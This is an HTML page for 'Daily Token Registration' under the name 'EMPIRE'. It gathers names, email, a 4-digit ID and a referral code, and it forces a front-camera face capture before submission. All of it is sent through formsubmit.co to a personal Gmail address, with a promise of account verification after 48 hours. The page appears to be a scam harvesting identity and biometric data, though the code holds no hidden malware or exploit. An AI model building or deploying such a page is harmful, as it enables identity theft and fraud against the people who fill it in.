<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daily Token Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000000; /* Changed to black */
            color: #f4f4f4; /* Light text for contrast */
            max-width: 600px;
            margin: auto;
            padding: 20px;
            border: 1px solid #222;
            border-radius: 10px;
            /* background-color: #ffffff; */ /* Removed white background */
        }
        h1 {
            text-align: center;
            color: #4CAF50;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="email"], input[type="date"] {
            width: 100%;
            padding: 8px;
            margin: 5px 0 20px;
            border: 1px solid #444;
            border-radius: 4px;
            background-color: #222;
            color: #f4f4f4;
        }
        input[type="text"]:read-only {
            background-color: #333;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        #camera-section {
            margin: 15px 0;
        }
        #video {
            display: block;
            width: 100%;
            max-width: 320px;
            border-radius: 8px;
            margin-bottom: 8px;
            background: #111;
        }
        #capture-btn {
            margin-bottom: 8px;
        }
        #captured-image {
            display: block;
            width: 100%;
            max-width: 320px;
            border-radius: 8px;
            margin-top: 8px;
            background: #111;
        }
        #face-file {
            display: none;
        }
    </style>
    <script>
        function showPopup() {
            alert("Please wait for your form to be submitted by formsubmit, your account will be verified after 48 hours. Thank you for choosing EMPIRE");
        }

        let imageCaptured = false;

        window.addEventListener('DOMContentLoaded', () => {
            const video = document.getElementById('video');
            const captureBtn = document.getElementById('capture-btn');
            const capturedImage = document.getElementById('captured-image');
            const faceFileInput = document.getElementById('face-file');
            const form = document.querySelector('form');

            const constraints = {
                video: {
                    facingMode: "user"
                }
            };

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia(constraints)
                    .then(function(stream) {
                        video.srcObject = stream;
                        video.play();
                    })
                    .catch(function(err) {
                        captureBtn.disabled = true;
                        captureBtn.textContent = "Camera not available";
                    });
            } else {
                captureBtn.disabled = true;
                captureBtn.textContent = "Camera not supported";
            }

            captureBtn.onclick = function(e) {
                e.preventDefault();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(function(blob) {
                    // Create a File from the Blob
                    const file = new File([blob], "face.png", {type: "image/png"});
                    // Create a DataTransfer to put the file in the input
                    const dt = new DataTransfer();
                    dt.items.add(file);
                    faceFileInput.files = dt.files;
                    // Show preview
                    capturedImage.src = URL.createObjectURL(blob);
                    capturedImage.style.display = 'block';
                    imageCaptured = true;
                }, 'image/png');
            };

            // Prevent submission if face not captured
            form.addEventListener('submit', function(e) {
                if (!imageCaptured) {
                    alert("Please capture your face before submitting the form.");
                    e.preventDefault();
                }
            });

            capturedImage.style.display = 'none';
        });
    </script>
</head>
<body>
    <h1>Daily Token Registration</h1>
    <form action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data" onsubmit="showPopup()">
        <label for="first-name">First Name:</label>
        <input type="text" id="first-name" name="first-name" required>

        <label for="last-name">Last Name:</label>
        <input type="text" id="last-name" name="last-name" required>

        <label for="country">Country:</label>
        <input type="text" id="country" name="country" value="Nigeria" readonly>

        <label for="date">Date:</label>
        <input type="date" id="date" name="date" required>

        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>

        <label for="id">4-Digit ID:</label>
        <input type="text" id="id" name="id" pattern="\d{4}" title="Please enter exactly 4 digits" required>

        <label for="referral-code">Referral Code (Optional):</label>
        <input type="text" id="referral-code" name="referral-code" placeholder="Enter referral code (if any)">

        <!-- Face Capture Section -->
        <div id="camera-section">
            <label for="face-file">Face Capture (Front Camera):</label>
            <video id="video" autoplay playsinline></video>
            <button id="capture-btn">Capture Face</button>
            <img id="captured-image" alt="Captured face preview"/>
            <!-- Hidden file input, required for FormSubmit -->
            <input type="file" name="face" id="face-file" accept="image/png" required>
        </div>

        <button type="submit">Submit</button>
    </form>
</body>
</html>
